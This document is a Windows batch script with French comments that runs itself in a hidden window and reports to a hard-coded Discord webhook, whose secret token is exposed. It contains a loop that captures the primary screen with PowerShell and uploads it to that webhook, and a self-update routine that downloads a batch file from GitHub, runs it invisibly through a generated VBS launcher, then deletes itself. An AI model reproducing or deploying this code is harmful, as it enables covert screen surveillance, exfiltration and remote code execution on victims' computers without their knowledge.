@echo off
if not "%1"=="hide" start /B cmd /c "%~0" hide & exit
setlocal enabledelayedexpansion
::salute num 333
set debutchemin=C:\Users\Aubin\Downloads\

:: 📌 Définition des variables
set WEBHOOK_URL=https://discord.com/api/webhooks/1334179975577862215/FQLGLyudyE8QhYH4OS9MoH-5970K2FU1Ug3tCZ0x7KdWJHHjVMXnSjzSsrOdL8yIGfEo
set SCREENSHOT_PATH=%debutchemin%\screenshot.png

set END_TIME=%TIME:~0,2%
set /A END_TIME+=0
set /A END_TIME+=1
set USER=Auren009
set REPO=lunettes-octo-flottantes

:: Définir le chemin vers le future fichier batch et vbs
set chemin=%debutchemin%paserelle.bat
set chemin_vbs=%debutchemin%lancer_cacheeeeee.vbs
set URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat
set DESTINATION=WebHook.bat



set version=2025-01-31T19


set photo=true
    set NbPhoto=2
    set TempsEntre=0.5
::

set message=true
    set MESSAGE1=Bonjour
::



if %message%==true (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"%MESSAGE1%\"}" %WEBHOOK_URL%
)




if %photo%==false (
    :: Si "photo" est égal à 1, prend une capture d'écran et l'envoie
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Lancement_des_capture\"}" %WEBHOOK_URL%

    :: 📸 Fonction pour prendre une capture d'écran
    :TAKE_SCREENSHOT
    powershell -command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); $bitmap.Save('%SCREENSHOT_PATH%', [System.Drawing.Imaging.ImageFormat]::Png); $bitmap.Dispose(); $graphics.Dispose();"

    :: 🖼 Vérifier que la capture a bien été prise
    if not exist "%SCREENSHOT_PATH%" (
        echo ❌ Erreur : Capture d'écran non trouvée !
        pause
        exit /b
    )

    :: 🚀 Envoyer la capture à Discord
    curl -F "file=@%SCREENSHOT_PATH%" %WEBHOOK_URL%

    :: 🎯 Vérification du temps d'envoi (toutes les 10 secondes pendant 30 secondes)
    set /A COUNT+=1
    if !COUNT! geq %NbPhoto% (
        curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Fin_des_capture\"}" %WEBHOOK_URL% 
        goto END
    )

    :: Pause de 10 secondes avant la prochaine capture
    timeout /t %TempsEntre% >nul
    goto TAKE_SCREENSHOT


)



:END

::Regarder la nouvelle version
    :: Récupérer les commits du dépôt GitHub et chercher la première occurrence de "date"
    curl -s https://api.github.com/repos/%USER%/%REPO%/commits | findstr /C:"date" > temp.txt

    :: Lire la première ligne contenant "date" et extraire proprement la date et l'heure
    for /f "tokens=2 delims=:," %%A in ('findstr /C:"date" temp.txt') do (
        set RAW_DATE=%%A
        goto :BREAK
    )

    :BREAK
    :: Nettoyage du fichier temporaire
    del temp.txt

    :: Supprimer les caractères superflus (" et ,)
    set RAW_DATE=%RAW_DATE:"=%
    set RAW_DATE=%RAW_DATE:,=%

    :: Supprimer la lettre "T" et extraire la date et l'heure



    set RAW_DATE=%RAW_DATE: =%

    set nouversion=%RAW_DATE%



::





if %nouversion% neq %version% (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Il existe une nouvelle version\"}" %WEBHOOK_URL%
    goto :debutversion
)
if %nouversion% == %version% (
    curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"C'est la derniere version\"}" %WEBHOOK_URL%
)


goto :finversion

:debutversion

:: Crée un nouveau fichier batch, paserelle, avec le chemin défini (Doit téléharger nouv version, puis la lancer et se suppr) Tout fait
echo @echo off > "%chemin%"
echo setlocal enabledelayedexpansion >> "%chemin%"
echo set "URL=https://raw.githubusercontent.com/Auren009/lunettes-octo-flottantes/main/WebHook.bat" >> "%chemin%"
echo set "DESTINATION=%debutchemin%WebHook.bat" >> "%chemin%"
echo curl -o "%DESTINATION%" "%URL%" > nul 2>&1 >> "%chemin%"
echo cscript //nologo "%debutchemin%lancerWebHook.vbs" >> "%chemin%"
echo del "%chemin_vbs%" >> "%chemin%"
echo del "%chemin%" >> "%chemin%"

curl -H "Content-Type: application/json" -X POST -d "{\"content\":\"Mise a jour\"}" %WEBHOOK_URL%

::Crée le fichier vbs
echo Set WshShell = CreateObject("WScript.Shell") > "%chemin_vbs%"
echo WshShell.Run "cmd /c ""%chemin%""", 0, False >> "%chemin_vbs%"



::Lance le vbs
cscript //nologo "%chemin_vbs%"

del "%chemin_vbs%"

:: Supprime le programme batch principal (se suppr)
del "%~f0"

:finversion



